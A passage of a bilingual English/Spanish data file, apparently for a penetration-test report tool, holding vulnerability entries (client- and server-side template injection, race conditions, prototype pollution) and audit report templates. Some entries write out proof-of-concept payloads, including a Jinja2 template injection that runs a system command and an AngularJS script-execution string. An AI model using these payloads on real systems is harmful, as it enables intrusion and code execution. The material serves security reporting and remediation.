            mediumTerm: 'If DTDs are required, configure the parser to limit the number of entity expansions.',
            longTerm: 'Consider using a data format other than XML, such as JSON, which is not susceptible to this type of attack.',
        },
        remediation_es: {
            shortTerm: 'Deshabilitar el procesamiento de DTD (Document Type Definition) en el analizador XML.',
            mediumTerm: 'Si se requieren DTD, configurar el analizador para limitar el número de expansiones de entidades.',
            longTerm: 'Considerar el uso de un formato de datos diferente a XML, como JSON, que no es susceptible a este tipo de ataque.',
        },
        references: ['https://en.wikipedia.org/wiki/Billion_laughs_attack'],
        tags: ['DoS', 'XML'],
    },
    {
        id: 'vuln-048',
        title_en: 'Client-Side Template Injection',
        title_es: 'Inyección de Plantillas del Lado del Cliente',
        cwe: 'CWE-1336',
        severity: 'High',
        cvss: {
            score: 8.8,
            vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
            attackVector: 'Network',
            attackComplexity: 'Low',
            privilegesRequired: 'None',
            userInteraction: 'Required',
            scope: 'Unchanged',
            confidentiality: 'High',
            integrity: 'High',
            availability: 'High',
        },
        overview_en: 'An attacker can execute malicious code by injecting template syntax into a client-side template. This is a form of XSS that occurs when user input is insecurely embedded within a client-side template.',
        overview_es: 'Un atacante puede ejecutar código malicioso inyectando sintaxis de plantilla en una plantilla del lado del cliente. Esta es una forma de XSS que ocurre cuando la entrada del usuario se incrusta de forma insegura dentro de una plantilla del lado del cliente.',
        technicalDescription_en: 'The application uses a client-side templating library (like AngularJS, Vue, etc.) and mixes user input with the template. An attacker can provide input that contains valid template syntax. When the template is rendered in the victim\'s browser, the attacker\'s payload is executed, leading to XSS.',
        technicalDescription_es: 'La aplicación utiliza una librería de plantillas del lado del cliente (como AngularJS, Vue, etc.) y mezcla la entrada del usuario con la plantilla. Un atacante puede proporcionar una entrada que contenga sintaxis de plantilla válida. Cuando la plantilla se renderiza en el navegador de la víctima, se ejecuta la carga útil del atacante, lo que conduce a XSS.',
        affectedComponents_en: '[TODO Specify the part of the application using the vulnerable template.]',
        affectedComponents_es: '[TODO Especificar la parte de la aplicación que utiliza la plantilla vulnerable.]',
        impact_en: 'Client-Side Template Injection leads to Cross-Site Scripting (XSS), allowing an attacker to steal session cookies, perform actions on behalf of the user, and compromise the user\'s interaction with the application.',
        impact_es: 'La inyección de plantillas del lado del cliente conduce a Cross-Site Scripting (XSS), lo que permite a un atacante robar cookies de sesión, realizar acciones en nombre del usuario y comprometer la interacción del usuario con la aplicación.',
        recommendations_en: 'Do not mix user input with template code. Use the templating framework\'s built-in features for safely rendering user data, which typically involves data binding that automatically handles encoding.',
        recommendations_es: 'No mezclar la entrada del usuario con el código de la plantilla. Utilice las funciones integradas del framework de plantillas para representar de forma segura los datos del usuario, lo que generalmente implica un enlace de datos que maneja automáticamente la codificación.',
        details_en: '[TODO Provide a PoC payload. For AngularJS, this could be `{{constructor.constructor(\'alert(1)\')()}}`]',
        details_es: '[TODO Proporcionar una carga útil de PoC. Para AngularJS, esto podría ser `{{constructor.constructor(\'alert(1)\')()}}`]',
        remediation_en: {
            shortTerm: 'Properly encode or sanitize all user-supplied data before it is rendered in a template.',
            mediumTerm: 'Review all client-side templates to ensure that user input is never concatenated directly into the template.',
            longTerm: 'Upgrade to modern web frameworks (like recent versions of React, Vue, or Angular) that are secure against template injection by default.',
        },
        remediation_es: {
            shortTerm: 'Codificar o sanitizar adecuadamente todos los datos suministrados por el usuario antes de que se representen en una plantilla.',
            mediumTerm: 'Revisar todas las plantillas del lado del cliente para asegurarse de que la entrada del usuario nunca se concatene directamente en la plantilla.',
            longTerm: 'Actualizar a frameworks web modernos (como versiones recientes de React, Vue o Angular) que sean seguros contra la inyección de plantillas por defecto.',
        },
        references: ['https://portswigger.net/web-security/cross-site-scripting/client-side-template-injection'],
        tags: ['XSS', 'Template Injection'],
    },
    {
        id: 'vuln-049',
        title_en: 'Server-Side Template Injection',
        title_es: 'Inyección de Plantillas del Lado del Servidor',
        cwe: 'CWE-1336',
        severity: 'Critical',
        cvss: {
            score: 9.8,
            vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
            attackVector: 'Network',
            attackComplexity: 'Low',
            privilegesRequired: 'None',
            userInteraction: 'None',
            scope: 'Unchanged',
            confidentiality: 'High',
            integrity: 'High',
            availability: 'High',
        },
        overview_en: 'An attacker can execute arbitrary code on the server by injecting malicious template syntax into a server-side template.',
        overview_es: 'Un atacante puede ejecutar código arbitrario en el servidor inyectando sintaxis de plantilla maliciosa en una plantilla del lado del servidor.',
        technicalDescription_en: 'The application uses a server-side templating engine (like Jinja2, FreeMarker, Velocity) and allows user input to be dynamically included in a template. If the input is not properly sanitized, an attacker can submit template expressions that are executed by the engine on the server. This can allow them to read files, execute commands, and compromise the server.',
        technicalDescription_es: 'La aplicación utiliza un motor de plantillas del lado del servidor (como Jinja2, FreeMarker, Velocity) y permite que la entrada del usuario se incluya dinámicamente en una plantilla. Si la entrada no se sanitiza correctamente, un atacante puede enviar expresiones de plantilla que son ejecutadas por el motor en el servidor. Esto puede permitirles leer archivos, ejecutar comandos y comprometer el servidor.',
        affectedComponents_en: '[TODO Specify the functionality and template engine, e.g., A marketing email feature using the Jinja2 templating engine.]',
        affectedComponents_es: '[TODO Especificar la funcionalidad y el motor de plantillas, p. ej., una función de correo electrónico de marketing que utiliza el motor de plantillas Jinja2.]',
        impact_en: 'Server-Side Template Injection often leads to remote code execution (RCE), giving the attacker full control over the application server.',
        impact_es: 'La inyección de plantillas del lado del servidor a menudo conduce a la ejecución remota de código (RCE), otorgando al atacante control total sobre el servidor de la aplicación.',
        recommendations_en: 'Never allow users to modify or submit template code. Use a "logic-less" templating engine if possible. If user input must be placed in a template, ensure it is strictly sanitized and contextually escaped.',
        recommendations_es: 'Nunca permitir que los usuarios modifiquen o envíen código de plantilla. Use un motor de plantillas "sin lógica" si es posible. Si la entrada del usuario debe colocarse en una plantilla, asegúrese de que esté estrictamente sanitizada y escapada contextualmente.',
        details_en: '[TODO Provide a PoC payload. For Jinja2, this could be `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}`.]',
        details_es: '[TODO Proporcionar una carga útil de PoC. Para Jinja2, esto podría ser `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}`.]',
        remediation_en: {
            shortTerm: 'Sanitize user input to remove any template syntax before it is processed.',
            mediumTerm: 'Use a sandboxed environment for template rendering to limit the potential impact of an exploit.',
            longTerm: 'Migrate to a safer templating solution or redesign the feature to avoid the need for dynamic template modification.',
        },
        remediation_es: {
            shortTerm: 'Sanitizar la entrada del usuario para eliminar cualquier sintaxis de plantilla antes de que se procese.',
            mediumTerm: 'Utilizar un entorno "sandbox" para la renderización de plantillas para limitar el impacto potencial de un exploit.',
            longTerm: 'Migrar a una solución de plantillas más segura o rediseñar la función para evitar la necesidad de modificación dinámica de plantillas.',
        },
        references: ['https://portswigger.net/web-security/server-side-template-injection'],
        tags: ['SSTI', 'RCE', 'Template Injection'],
    },
    {
        id: 'vuln-050',
        title_en: 'Race Condition',
        title_es: 'Condición de Carrera',
        cwe: 'CWE-362',
        severity: 'Medium',
        cvss: {
            score: 6.5,
            vectorString: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L',
            attackVector: 'Network',
            attackComplexity: 'High',
            privilegesRequired: 'Low',
            userInteraction: 'None',
            scope: 'Unchanged',
            confidentiality: 'None',
            integrity: 'High',
            availability: 'Low',
        },
        overview_en: 'An attacker can exploit a flaw in the application\'s handling of concurrent operations to cause unintended behavior, such as bypassing security checks or corrupting data.',
        overview_es: 'Un atacante puede explotar un fallo en el manejo de operaciones concurrentes de la aplicación para causar un comportamiento no deseado, como eludir controles de seguridad o corromper datos.',
        technicalDescription_en: 'The application performs a sequence of operations that are not atomic (e.g., checking a user\'s balance and then making a withdrawal). An attacker can send multiple requests simultaneously, causing the operations to interleave in an unexpected way. For example, they could submit two withdrawal requests at the same time, and the application might check the balance for both requests before either withdrawal is processed, allowing the user to withdraw more money than they have.',
        technicalDescription_es: 'La aplicación realiza una secuencia de operaciones que no son atómicas (p. ej., verificar el saldo de un usuario y luego realizar un retiro). Un atacante puede enviar múltiples solicitudes simultáneamente, haciendo que las operaciones se intercalen de una manera inesperada. Por ejemplo, podrían enviar dos solicitudes de retiro al mismo tiempo, y la aplicación podría verificar el saldo para ambas solicitudes antes de que se procese cualquiera de los retiros, permitiendo al usuario retirar más dinero del que tiene.',
        affectedComponents_en: '[TODO Specify the functionality that is vulnerable to a race condition, e.g., transferring funds or using a one-time coupon.]',
        affectedComponents_es: '[TODO Especificar la funcionalidad que es vulnerable a una condición de carrera, p. ej., transferir fondos o usar un cupón de un solo uso.]',
        impact_en: 'Race conditions can lead to data corruption, financial loss, and bypass of security logic. The impact is highly dependent on the specific context.',
        impact_es: 'Las condiciones de carrera pueden conducir a la corrupción de datos, pérdidas financieras y la elusión de la lógica de seguridad. El impacto depende en gran medida del contexto específico.',
        recommendations_en: 'Ensure that sequences of operations that must be atomic are protected by proper locking mechanisms (e.g., database transactions, mutexes, semaphores).',
        recommendations_es: 'Asegurarse de que las secuencias de operaciones que deben ser atómicas estén protegidas por mecanismos de bloqueo adecuados (p. ej., transacciones de base de datos, mutex, semáforos).',
        details_en: '[TODO Provide a PoC, often using a tool like Burp Suite\'s Turbo Intruder to send many requests simultaneously.]',
        details_es: '[TODO Proporcionar un PoC, a menudo usando una herramienta como Turbo Intruder de Burp Suite para enviar muchas solicitudes simultáneamente.]',
        remediation_en: {
            shortTerm: 'Implement a pessimistic lock (e.g., a database row lock) on the resource being modified.',
            mediumTerm: 'Refactor the business logic to use atomic operations provided by the database or language.',
            longTerm: 'Perform a thorough review of all concurrent operations in the application to identify other potential race conditions.',
        },
        remediation_es: {
            shortTerm: 'Implementar un bloqueo pesimista (p. ej., un bloqueo de fila de base de datos) en el recurso que se está modificando.',
            mediumTerm: 'Refactorizar la lógica de negocio para utilizar operaciones atómicas proporcionadas por la base de datos o el lenguaje.',
            longTerm: 'Realizar una revisión exhaustiva de todas las operaciones concurrentes en la aplicación para identificar otras posibles condiciones de carrera.',
        },
        references: ['https://portswigger.net/web-security/race-conditions'],
        tags: ['Race Condition', 'Business Logic'],
    },
    {
        id: 'vuln-051',
        title_en: 'Prototype Pollution',
        title_es: 'Contaminación de Prototipos',
        cwe: 'CWE-1321',
        severity: 'High',
        cvss: {
            score: 8.8,
            vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
            attackVector: 'Network',
            attackComplexity: 'Low',
            privilegesRequired: 'None',
            userInteraction: 'Required',
            scope: 'Unchanged',
            confidentiality: 'High',
            integrity: 'High',
            availability: 'High',
        },
        overview_en: 'An attacker can manipulate the `__proto__`, `constructor`, or `prototype` properties of JavaScript objects, leading to the modification of the prototype of base objects. This can result in denial of service, cross-site scripting, or even remote code execution.',
        overview_es: 'Un atacante puede manipular las propiedades `__proto__`, `constructor` o `prototype` de los objetos de JavaScript, lo que lleva a la modificación del prototipo de los objetos base. Esto puede resultar en denegación de servicio, cross-site scripting o incluso ejecución remota de código.',
        technicalDescription_en: 'The application insecurely merges or clones objects. An attacker can supply a malicious JSON payload (e.g., `{"__proto__": {"isAdmin": true}}`) that, when processed, modifies the `Object.prototype` to include an `isAdmin` property. Subsequently, every object in the application will inherit this property, potentially leading to privilege escalation.',
        technicalDescription_es: 'La aplicación fusiona o clona objetos de forma insegura. Un atacante puede suministrar una carga útil JSON maliciosa (p. ej., `{"__proto__": {"isAdmin": true}}`) que, al procesarse, modifica el `Object.prototype` para incluir una propiedad `isAdmin`. Posteriormente, cada objeto en la aplicación heredará esta propiedad, lo que podría conducir a una escalada de privilegios.',
        affectedComponents_en: '[TODO Specify the vulnerable code, often related to object merging or query parameter parsing libraries.]',
        affectedComponents_es: '[TODO Especificar el código vulnerable, a menudo relacionado con la fusión de objetos o las librerías de análisis de parámetros de consulta.]',
        impact_en: 'Prototype pollution can have widespread and unpredictable consequences, ranging from denial of service to remote code execution, depending on the application logic and the properties that are polluted.',
        impact_es: 'La contaminación de prototipos puede tener consecuencias generalizadas e impredecibles, que van desde la denegación de servicio hasta la ejecución remota de código, dependiendo de la lógica de la aplicación y las propiedades que se contaminan.',
        recommendations_en: 'Sanitize user input to reject keys named `__proto__`, `constructor`, or `prototype`. Use `Object.create(null)` to create objects that do not have a prototype. Use secure object merging libraries and keep all dependencies up to date.',
        recommendations_es: 'Sanitizar la entrada del usuario para rechazar claves llamadas `__proto__`, `constructor` o `prototype`. Usar `Object.create(null)` para crear objetos que no tengan un prototipo. Usar librerías seguras de fusión de objetos y mantener todas las dependencias actualizadas.',
        details_en: '[TODO Provide a PoC payload and demonstrate its effect on the application.]',
        details_es: '[TODO Proporcionar una carga útil de PoC y demostrar su efecto en la aplicación.]',
        remediation_en: {
            shortTerm: 'Implement input validation to block any payloads containing `__proto__`, `constructor`, or `prototype` keys.',
            mediumTerm: 'Update all libraries and frameworks to their latest versions, as many common libraries have been patched for this vulnerability.',
            longTerm: 'Use `Object.freeze(Object.prototype)` at the start of the application to prevent any modifications to the base object prototype.',
        },
        remediation_es: {
            shortTerm: 'Implementar la validación de entrada para bloquear cualquier carga útil que contenga las claves `__proto__`, `constructor` o `prototype`.',
            mediumTerm: 'Actualizar todas las librerías y frameworks a sus últimas versiones, ya que muchas librerías comunes han sido parcheadas para esta vulnerabilidad.',
            longTerm: 'Usar `Object.freeze(Object.prototype)` al inicio de la aplicación para evitar cualquier modificación al prototipo del objeto base.',
        },
        references: ['https://portswigger.net/web-security/prototype-pollution'],
        tags: ['Prototype Pollution', 'JavaScript'],
    }
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'template-1',
    name_en: 'Full Audit',
    name_es: 'Auditoría Completa',
    icon: 'Scan',
    description_en: 'A comprehensive security audit covering external, internal, and web application testing.',
    description_es: 'Auditoría de seguridad integral que abarca pruebas externas, internas y de aplicaciones web.',
    scope_en:
`<!-- section-id: template-1-en-1 -->

## Executive Summary
This report details the findings of a comprehensive security assessment conducted on behalf of **[TODO Client Name]**. The primary objective was to identify and assess security vulnerabilities across the company's external and internal networks, as well as key web applications. The engagement simulated real-world attack scenarios to provide a realistic evaluation of the current security posture.

---

<!-- section-id: template-1-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]**. The testing approach combined automated scanning and manual exploitation techniques, following a black-box/gray-box model.

### Scope
- **Web Applications:** [TODO list of domains/apps]
- **External Network:** [TODO list of IPs/ranges]
- **Internal Network:** [TODO list of IPs/ranges]

### Methodology
1. **Reconnaissance:** Mapping the attack surface and gathering information.
2. **Vulnerability Analysis:** Identifying weaknesses in systems and applications.
3. **Exploitation:** Attempting to gain unauthorized access.
4. **Post-Exploitation:** Assessing the impact of a breach and identifying lateral movement paths.
5. **Reporting:** Documenting all findings and providing actionable recommendations.

---

<!-- section-id: template-1-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial reconnaissance to the final objectives achieved. This should be detailed and easy to follow.]

---

<!-- section-id: template-1-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise, large-scale data breaches, or severe disruption of key business functions. |
| High | 7.0 - 8.9 | Vulnerabilities that could lead to unauthorized access, data exposure, or significant disruption of services. |
| Medium | 4.0 - 6.9 | Vulnerabilities that could expose sensitive information or provide attackers with a foothold for further attacks. |
| Low | 0.1 - 3.9 | Minor issues that have a low impact or are difficult to exploit. |
| Informational | 0.0 | Observations that do not pose an immediate risk but are relevant to the security posture. |`,
    scope_es:
`<!-- section-id: template-1-es-1 -->

## Resumen Ejecutivo
Este informe detalla los hallazgos de una evaluación de seguridad integral realizada para **[TODO Nombre del Cliente]**. El objetivo principal fue identificar y evaluar las vulnerabilidades de seguridad en las redes externas e internas de la empresa, así como en aplicaciones web clave. El compromiso simuló escenarios de ataque del mundo real para proporcionar una evaluación realista de la postura de seguridad actual.

---

<!-- section-id: template-1-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]**. El enfoque de las pruebas combinó escaneo automatizado y técnicas de explotación manual, siguiendo un modelo de caja negra/gris.

### Alcance
- **Aplicaciones Web:** [TODO lista de dominios/apps]
- **Red Externa:** [TODO lista de IPs/rangos]
- **Red Interna:** [TODO lista de IPs/rangos]

### Metodología
1. **Reconocimiento:** Mapeo de la superficie de ataque y recopilación de información.
2. **Análisis de Vulnerabilidades:** Identificación de debilidades en sistemas y aplicaciones.
3. **Explotación:** Intento de obtener acceso no autorizado.
4. **Post-Explotación:** Evaluación del impacto de una brecha e identificación de rutas de movimiento lateral.
5. **Reporte:** Documentación de todos los hallazgos y provisión de recomendaciones accionables.

---

<!-- section-id: template-1-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el reconocimiento inicial hasta los objetivos finales alcanzados. Debe ser detallada y fácil de seguir.]

---

<!-- section-id: template-1-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema, brechas de datos a gran escala o una interrupción grave de las funciones clave del negocio. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que podrían llevar a un acceso no autorizado, exposición de datos o una interrupción significativa de los servicios. |
| Media | 4.0 - 6.9 | Vulnerabilidades que podrían exponer información sensible o proporcionar a los atacantes un punto de apoyo para ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que tienen un bajo impacto o son difíciles de explotar. |
| Informativa | 0.0 | Observaciones que no representan un riesgo inmediato pero son relevantes para la postura de seguridad. |`
  },
  {
    id: 'template-2',
    name_en: 'External Audit',
    name_es: 'Auditoría Externa',
    icon: 'Globe',
    description_en: 'Focuses on publicly accessible assets to identify vulnerabilities from an attacker\'s perspective.',
    description_es: 'Se centra en los activos accesibles públicamente para identificar vulnerabilidades desde la perspectiva de un atacante.',
    scope_en:
`<!-- section-id: template-2-en-1 -->

## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **[TODO Client Name]**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

<!-- section-id: template-2-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** [TODO list of domains/apps]
- **External Network:** [TODO list of IPs/ranges]

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

<!-- section-id: template-2-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, focusing on how the external perimeter was breached or could be breached.]

---

<!-- section-id: template-2-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`,
    scope_es:
`<!-- section-id: template-2-es-1 -->

## Resumen Ejecutivo
Este informe describe los resultados de una prueba de penetración externa realizada sobre los activos de **[TODO Nombre del Cliente]** expuestos a Internet. La evaluación tuvo como objetivo identificar vulnerabilidades que podrían ser explotadas por un atacante remoto para comprometer la seguridad del perímetro de la organización.

---

<!-- section-id: template-2-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]** desde la perspectiva de un atacante externo no autenticado (caja negra).

### Alcance
- **Aplicaciones Web:** [TODO lista de dominios/apps]
- **Red Externa:** [TODO lista de IPs/rangos]

### Metodología
1. **Reconocimiento:** Descubrimiento de subdominios, puertos abiertos y servicios.
2. **Escaneo de Vulnerabilidades:** Uso de herramientas automatizadas para identificar vulnerabilidades comunes.
3. **Verificación Manual y Explotación:** Validación manual de hallazgos e intento de explotar las debilidades identificadas.
4. **Reporte:** Documentación de vulnerabilidades y provisión de guías de remediación.

---

<!-- section-id: template-2-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, centrándose en cómo se rompió o podría romperse el perímetro externo.]

---

<!-- section-id: template-2-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema o a una brecha en el perímetro de la red. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que podrían permitir a un atacante obtener acceso no autorizado a sistemas o datos. |
| Media | 4.0 - 6.9 | Debilidades que podrían revelar información sensible o ser encadenadas con otras vulnerabilidades. |
| Baja | 0.1 - 3.9 | Problemas menores que reducen la postura de seguridad general pero no son directamente explotables. |
| Informativa | 0.0 | Observaciones sobre la huella externa de la organización. |`,
    appendix_en: `
<!-- section-id: template-2-en-appendix-1 -->

### A. Subdomain Discovery
| URL | Description | Discovery Method |
|---|---|---|
| [TODO FILL IN DISCOVERED VHOSTS/SUBDOMAINS] | | |

---

<!-- section-id: template-2-en-appendix-2 -->

### B. Open Ports and Services
| IP Address | Port | Service | Banner/Version |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |
`,
    appendix_es: `
<!-- section-id: template-2-es-appendix-1 -->

### A. Descubrimiento de Subdominios
| URL | Descripción | Método de Descubrimiento |
|---|---|---|
| [TODO RELLENAR VHOSTS/SUBDOMINIOS DESCUBIERTOS] | | |

---

<!-- section-id: template-2-es-appendix-2 -->

### B. Puertos y Servicios Abiertos
| Dirección IP | Puerto | Servicio | Banner/Versión |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |
`
  },
  {
    id: 'template-3',
    name_en: 'Internal Audit',
    name_es: 'Auditoría Interna',
    icon: 'Network',
    description_en: 'An assessment of the internal network to find security weaknesses from within the perimeter.',
    description_es: 'Evaluación de la red interna para encontrar debilidades de seguridad desde dentro del perímetro.',
    scope_en:
`<!-- section-id: template-3-en-1 -->

## Executive Summary
This report presents the findings from an internal network penetration test for **[TODO Client Name]**. The assessment simulated an attacker who has already gained initial access to the internal corporate network (e.g., a malicious insider or a compromised workstation). The goal was to identify vulnerabilities that could lead to privilege escalation, lateral movement, and compromise of critical internal systems like Domain Controllers.

---

<!-- section-id: template-3-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an authenticated, non-privileged user on the internal network (gray-box).

### Scope
- **Internal Network Segments:** [TODO list of IPs/ranges, e.g., 192.168.1.0/24]
- **Key Systems:** [TODO e.g., Domain Controllers, File Servers]

### Methodology
1. **Internal Reconnaissance:** Enumerating hosts, services, users, and shares.
2. **Vulnerability Analysis:** Identifying misconfigurations, missing patches, and weak protocols.
3. **Lateral Movement & Privilege Escalation:** Exploiting vulnerabilities to move across the network and escalate privileges.
4. **Domain Dominance:** Attempting to compromise the Active Directory domain.
5. **Reporting:** Documenting attack paths and providing remediation guidance.

---

<!-- section-id: template-3-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial internal access to domain compromise.]

---

<!-- section-id: template-3-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that lead to Domain Admin compromise or control of critical servers. |
| High | 7.0 - 8.9 | Vulnerabilities allowing for significant privilege escalation or lateral movement. |
| Medium | 4.0 - 6.9 | Misconfigurations or weaknesses that could aid an attacker in reconnaissance or further attacks. |
| Low | 0.1 - 3.9 | Minor issues that represent a deviation from best practices. |
| Informational | 0.0 | Observations about the internal network environment. |`,
    scope_es:
`<!-- section-id: template-3-es-1 -->

## Resumen Ejecutivo
Este informe presenta los hallazgos de una prueba de penetración de la red interna para **[TODO Nombre del Cliente]**. La evaluación simuló a un atacante que ya ha obtenido acceso inicial a la red corporativa interna (p. ej., un empleado malintencionado o una estación de trabajo comprometida). El objetivo fue identificar vulnerabilidades que pudieran conducir a la escalada de privilegios, movimiento lateral y compromiso de sistemas internos críticos como los Controladores de Dominio.

---

<!-- section-id: template-3-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]** desde la perspectiva de un usuario autenticado y sin privilegios en la red interna (caja gris).

### Alcance
- **Segmentos de Red Interna:** [TODO lista de IPs/rangos, p. ej., 192.168.1.0/24]
- **Sistemas Clave:** [TODO p. ej., Controladores de Dominio, Servidores de Archivos]

### Metodología
1. **Reconocimiento Interno:** Enumeración de hosts, servicios, usuarios y recursos compartidos.
2. **Análisis de Vulnerabilidades:** Identificación de configuraciones incorrectas, parches faltantes y protocolos débiles.
3. **Movimiento Lateral y Escalada de Privilegios:** Explotación de vulnerabilidades para moverse a través de la red y escalar privilegios.
4. **Dominio del Dominio:** Intento de comprometer el dominio de Active Directory.
5. **Reporte:** Documentación de las rutas de ataque y provisión de guías de remediación.

---

<!-- section-id: template-3-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el acceso interno inicial hasta el compromiso del dominio.]

---

<!-- section-id: template-3-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que conducen al compromiso del Administrador del Dominio o al control de servidores críticos. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que permiten una escalada de privilegios significativa o movimiento lateral. |
| Media | 4.0 - 6.9 | Configuraciones incorrectas o debilidades que podrían ayudar a un atacante en el reconocimiento o ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que representan una desviación de las mejores prácticas. |
| Informativa | 0.0 | Observaciones sobre el entorno de la red interna. |`,
    appendix_en: `
<!-- section-id: template-3-en-appendix-1 -->

### A. Host & Service Discovery
| IP Address | Port | Service | Notes |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |

---

<!-- section-id: template-3-en-appendix-2 -->

### B. Compromised Credentials
| Username | Domain | Password / Hash | Source |
|---|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] | [TODO e.g., Kerberoasting] |
`,
    appendix_es: `
<!-- section-id: template-3-es-appendix-1 -->

### A. Descubrimiento de Hosts y Servicios
| Dirección IP | Puerto | Servicio | Notas |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |

---

<!-- section-id: template-3-es-appendix-2 -->

### B. Credenciales Comprometidas
| Usuario | Dominio | Contraseña / Hash | Origen |
|---|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] | [TODO p. ej., Kerberoasting] |
`
  },
  {
    id: 'template-wifi',
    name_en: 'WiFi Audit',
    name_es: 'Auditoría WiFi',
    icon: 'Wifi',
    description_en: 'Assesses wireless network security, including password cracking and client isolation.',
    description_es: 'Evalúa la seguridad de redes inalámbricas, incluyendo cracking de contraseñas y aislamiento de clientes.',
    scope_en:
`<!-- section-id: template-wifi-en-1 -->

## Executive Summary
This report summarizes the security assessment of the wireless networks at **[TODO Client Name]**. The audit focused on identifying vulnerabilities related to authentication, encryption, and client segregation that could allow an unauthorized user to gain access to the corporate or guest wireless networks.

---

<!-- section-id: template-wifi-en-2 -->

## Scope & Methodology
The assessment was conducted on **[TODO Date]** at the **[TODO Physical Location]** premises.

### Scope
- **Corporate WiFi Network:** SSID "[TODO Specify Corporate SSID]"
- **Guest WiFi Network:** SSID "[TODO Specify Guest SSID]"

### Methodology
1. **Reconnaissance:** Identifying visible and hidden wireless networks.
2. **Authentication Attacks:** Attempting to crack the Pre-Shared Key (PSK) via captured handshakes.
3. **Client-Side Attacks:** Performing "Evil Twin" and captive portal attacks.
4. **Post-Authentication Analysis:** Assessing client isolation and access to internal resources after connecting.
5. **Reporting:** Detailing findings and providing security recommendations.

---

<!-- section-id: template-wifi-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, such as capturing a WPA handshake and cracking it, or setting up an Evil Twin AP.]

---

<!-- section-id: template-wifi-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that allow direct access to the internal corporate network. |
| High | 7.0 - 8.9 | Weaknesses that allow an attacker to decrypt traffic or impersonate legitimate users. |
| Medium | 4.0 - 6.9 | Issues like lack of client isolation on guest networks or weak captive portals. |
| Low | 0.1 - 3.9 | Deviations from best practices, such as broadcasting unnecessary SSIDs. |
| Informational | 0.0 | General observations about the wireless environment. |`,
    scope_es:
`<!-- section-id: template-wifi-es-1 -->

## Resumen Ejecutivo
Este informe resume la evaluación de seguridad de las redes inalámbricas en **[TODO Nombre del Cliente]**. La auditoría se centró en identificar vulnerabilidades relacionadas con la autenticación, el cifrado y la segregación de clientes que podrían permitir a un usuario no autorizado obtener acceso a las redes inalámbricas corporativas o de invitados.

---

<!-- section-id: template-wifi-es-2 -->

## Alcance y Metodología
